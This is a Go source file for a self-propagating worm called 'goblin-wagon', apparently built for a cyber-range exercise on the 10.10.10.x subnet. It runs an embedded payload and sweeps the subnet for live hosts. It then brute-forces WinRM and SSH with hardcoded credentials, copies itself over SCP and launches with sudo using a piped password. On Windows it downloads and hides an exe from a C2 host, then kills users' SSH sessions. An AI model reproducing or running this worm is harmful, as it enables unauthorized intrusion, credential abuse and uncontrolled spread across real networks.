package main

import (
	"context"
	_ "embed"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"
	"unicode"

	"github.com/masterzen/winrm"
	"golang.org/x/crypto/ssh"
)

type Platform struct {
	OS   string
	Arch string
}

func is_only_letters(s string) bool {
	for _, character := range s {
		if !unicode.IsLetter(character) {
			return false
		}
	}
	return true
}

func discover_hosts(subnet string) []string {
	var (
		alive []string
		mu    sync.Mutex
		wg    sync.WaitGroup
	)

	for i := 1; i < 255; i++ {
		ip := fmt.Sprintf("%s.%d", subnet, i)
		wg.Add(1)
		go func(target string) {
			defer wg.Done()

			// send 3 pings, need all 3 to respond
			cmd := exec.Command("ping", "-c", "3", "-W", "1", target)
			if runtime.GOOS == "windows" {
				cmd = exec.Command("ping", "-n", "3", "-w", "1000", target)
			}

			if err := cmd.Run(); err == nil {
				log.Printf("LOG_STATUS:    host alive: %s", target)
				mu.Lock()
				alive = append(alive, target)
				mu.Unlock()
			}
		}(ip)
	}

	wg.Wait()
	return alive
}

func establish_winRM(host_ip, username, pswd string) (*winrm.Client, error) {
	endpoint := winrm.NewEndpoint(
		host_ip, // host
		5985,    // port (5985 http, 5986 https)
		false,   // https
		false,   // insecure
		nil,     // tlsCert
		nil,     // tlsKey
		nil,     // caCert
		0,       // timeout
	)

	client, err := winrm.NewClient(endpoint, username, pswd)
	if err != nil {
		return nil, err
	}

	return client, nil
}

func run_WinRM_cmds(winrm_client *winrm.Client, cmd string) error {
	_, err := winrm_client.RunWithContext(context.Background(), cmd, io.Discard, io.Discard)
	return err
}

func establish_SSH(host_ip, username, pswd string, keyPath string) (*ssh.Client, error) {
	authMethods := []ssh.AuthMethod{
		ssh.Password(pswd),
	}

	// try key if provided
	if keyPath != "" {
		key, err := os.ReadFile(keyPath)
		if err == nil {
			signer, err := ssh.ParsePrivateKey(key)
			if err == nil {
				authMethods = append([]ssh.AuthMethod{ssh.PublicKeys(signer)}, authMethods...)
			}
		}
	}

	config := &ssh.ClientConfig{
		User:            username,
		Auth:            authMethods,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	client, err := ssh.Dial("tcp", host_ip+":22", config)
	if err != nil {
		return nil, err
	}
	return client, nil
}

func run_SSH_cmds(ssh_client *ssh.Client, cmd string) error {
	session, err := ssh_client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	return session.Run(cmd)

}

func spread() {
	exclusion_list := []string{
		"10.10.10.200",
		// "10.10.10.82",
		// "10.10.10.83",
		// "10.10.10.84",
		// "10.10.10.85",
		// "10.10.10.86",
		// "10.10.10.87",
		// "10.10.10.88",
        // "10.10.10.89",
	}

	for i := 200; i < 255; i++ {
		exclusion_list = append(exclusion_list, fmt.Sprintf("10.10.10.%d", i))
	}

	exclusion_map := make(map[string]bool)
	for _, ip := range exclusion_list {
		exclusion_map[ip] = true
	}

	creds := []struct {
		user, pass, key string
	}{
		{"sjohnson", "UwU?OwO!67", ""},
		{"Administrator", "UwU?OwO!67", ""},
		{"cyberrange", "Cyberrange123!", "/home/cyberrange/.ssh/id_rsa"},
		{"root", "Cyberrange123!", "/root/.ssh/id_rsa"},
	}

	target_hosts := discover_hosts("10.10.10")

	selfPath, _ := os.Executable()
	selfData, err := os.ReadFile(selfPath)
	if err != nil {
		log.Printf("ERROR_LOG:   could not read self: %v", err)
		return
	}

	var wg sync.WaitGroup
	for _, host_ip := range target_hosts {
		if exclusion_map[host_ip] {
			continue
		}

		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			done := make(chan string, 2)

			// try WinRM with all creds
			go func() {
				for _, c := range creds {
					log.Printf("EXEC_LOG:    WinRM | %s | trying %s", ip, c.user)
					client, err := establish_winRM(ip, c.user, c.pass)
					if err != nil {
						log.Printf("ERROR_LOG:   WinRM | %s | auth failed for %s: %v", ip, c.user, err)
						continue
					}
					// verify WinRM actually works by running a test command
					if err := run_WinRM_cmds(client, "whoami"); err != nil {
						log.Printf("ERROR_LOG:   WinRM | %s | connection verify failed for %s: %v", ip, c.user, err)
						continue
					}
					log.Printf("LOG_STATUS:    WinRM | %s | auth succeeded with %s", ip, c.user)
					if err := drop_and_run_winrm(client, selfData, ip); err != nil {
						log.Printf("ERROR_LOG:   WinRM | %s | drop failed: %v", ip, err)
						continue
					}
					done <- "winrm"
					return
				}
				log.Printf("ERROR_LOG:   WinRM | %s | all creds exhausted", ip)
			}()

			// try SSH with all creds
			go func() {
				for _, c := range creds {
					log.Printf("EXEC_LOG:    SSH | %s | trying %s", ip, c.user)
					client, err := establish_SSH(ip, c.user, c.pass, c.key)
					if err != nil {
						log.Printf("ERROR_LOG:   SSH | %s | auth failed for %s: %v", ip, c.user, err)
						continue
					}
					log.Printf("LOG_STATUS:    SSH | %s | auth succeeded with %s", ip, c.user)
					defer client.Close()
					if err := drop_and_run_ssh(client, selfData, ip); err != nil {
						log.Printf("ERROR_LOG:   SSH | %s | drop failed: %v", ip, err)
						continue
					}
					done <- "ssh"
					return
				}
				log.Printf("ERROR_LOG:   SSH | %s | all creds exhausted", ip)
			}()

			select {
			case method := <-done:
				log.Printf("LOG_STATUS:    spread to %s succeeded via %s", ip, method)
			case <-time.After(30 * time.Second):
				log.Printf("ERROR_LOG:   spread to %s timed out", ip)
			}
		}(host_ip)
	}
	wg.Wait()
}

func drop_and_run_ssh(client *ssh.Client, data []byte, ip string) error {
	log.Printf("EXEC_LOG:    SSH | %s | opening session for SCP drop", ip)
	session, err := client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	log.Printf("EXEC_LOG:    SSH | %s | writing %d bytes via SCP", ip, len(data))
	go func() {
		w, _ := session.StdinPipe()
		defer w.Close()
		fmt.Fprintf(w, "C0700 %d goblin-wagon\n", len(data))
		w.Write(data)
		fmt.Fprint(w, "\x00")
	}()

	if err := session.Run("scp -t /tmp/goblin-wagon"); err != nil {
		log.Printf("ERROR_LOG:   SSH | %s | SCP transfer failed: %v", ip, err)
		return err
	}
	log.Printf("LOG_STATUS:    SSH | %s | binary dropped to /tmp/goblin-wagon", ip)

	// run payload
	execSession, err := client.NewSession()
	if err != nil {
		return err
	}
	defer execSession.Close()

	runCmd := `
chmod +x /tmp/goblin-wagon
if sudo -n true 2>/dev/null; then
    nohup sudo /tmp/goblin-wagon > /dev/null 2>&1 &
elif echo 'Cyberrange123!' | sudo -S true 2>/dev/null; then
    echo 'Cyberrange123!' | sudo -S nohup /tmp/goblin-wagon > /dev/null 2>&1 &
else
    nohup /tmp/goblin-wagon > /dev/null 2>&1 &
fi
`
	if err := execSession.Run(runCmd); err != nil {
		log.Printf("ERROR_LOG:   SSH | %s | execution failed: %v", ip, err)
		return err
	}
	log.Printf("LOG_STATUS:    SSH | %s | payload executing on target", ip)

	// wait for wagon to finish then kill all sessions FROM OUTSIDE
	time.Sleep(90 * time.Second)
	killSession, err := client.NewSession()
	if err != nil {
		log.Printf("ERROR_LOG:   SSH | %s | could not open kill session: %v", ip, err)
		return nil
	}
	defer killSession.Close()
	log.Printf("EXEC_LOG:    SSH | %s | killing all sessions", ip)
	killSession.Run("pkill -9 -u cyberrange sshd; pkill -9 -u sjohnson sshd; pkill -9 -u root sshd")
	log.Printf("LOG_STATUS:    SSH | %s | sessions killed", ip)

	return nil
}

func drop_and_run_winrm(client *winrm.Client, data []byte, ip string) error {
	// serve the binary from your C2 and have target pull it
	cmd := `powershell -Command "Invoke-WebRequest -Uri 'http://10.10.10.80/goblin-wagon.exe' -OutFile 'C:\Windows\Temp\goblin-wagon.exe'"`
	if err := run_WinRM_cmds(client, cmd); err != nil {
		log.Printf("ERROR_LOG:   WinRM | %s | download failed: %v", ip, err)
		return err
	}
	return run_WinRM_cmds(client, `powershell -Command "Start-Process 'C:\Windows\Temp\goblin-wagon.exe' -WindowStyle Hidden"`)
}

//go:embed binaries/payload_linux_amd64
var payload_linux_amd64 []byte

//go:embed binaries/payload_linux_arm64
var payload_linux_arm64 []byte

//go:embed binaries/payload_windows_amd64.exe
var payload_windows_amd64 []byte

func main() {
	log.SetFlags(log.Ltime | log.Lshortfile)
	log.Println("EXEC_LOG:    goblin-wagon starting")

	host_os := runtime.GOOS
	arch := runtime.GOARCH

	log.Printf("EXEC_LOG:    detected OS: %s | Arch: %s", host_os, arch)

	payloads := map[Platform][]byte{
		{OS: "linux", Arch: "amd64"}:   payload_linux_amd64,
		{OS: "linux", Arch: "arm64"}:   payload_linux_arm64,
		{OS: "windows", Arch: "amd64"}: payload_windows_amd64,
	}

	key := Platform{OS: host_os, Arch: arch}
	log.Printf("EXEC_LOG:    looking up platform key: %+v", key)

	data, ok := payloads[key]
	if !ok {
		log.Printf("ERROR_LOG:   no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
		return
	}
	log.Printf("LOG_STATUS:    payload found, size: %d bytes", len(data))

	ext := ""
	if host_os == "windows" {
		ext = ".exe"
	}

	tmp, err := os.CreateTemp("", "svc*"+ext)
	if err != nil {
		log.Printf("ERROR_LOG:   failed to create temp file: %v", err)
		return
	}
	log.Printf("EXEC_LOG:    temp file created: %s", tmp.Name())

	n, err := tmp.Write(data)
	if err != nil {
		log.Printf("ERROR_LOG:   failed to write payload to temp file: %v", err)
		return
	}
	log.Printf("LOG_STATUS:    wrote %d bytes to temp file", n)
	tmp.Close()

	if err := os.Chmod(tmp.Name(), 0700); err != nil {
		log.Printf("ERROR_LOG:   chmod failed: %v", err)
		return
	}
	log.Printf("EXEC_LOG:    chmod 0700 applied")

	cmd := exec.Command(tmp.Name())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	log.Printf("EXEC_LOG:    executing payload: %s", tmp.Name())

	if err := cmd.Run(); err != nil {
		log.Printf("ERROR_LOG:   payload execution failed: %v", err)
	} else {
		log.Printf("LOG_STATUS:    payload exited cleanly")
	}

	if err := os.Remove(tmp.Name()); err != nil {
		log.Printf("ERROR_LOG:   failed to remove temp file: %v", err)
	} else {
		log.Printf("EXEC_LOG:    temp file cleaned up")
	}

	log.Println("EXEC_LOG:    goblin-wagon done")

	spread()
}
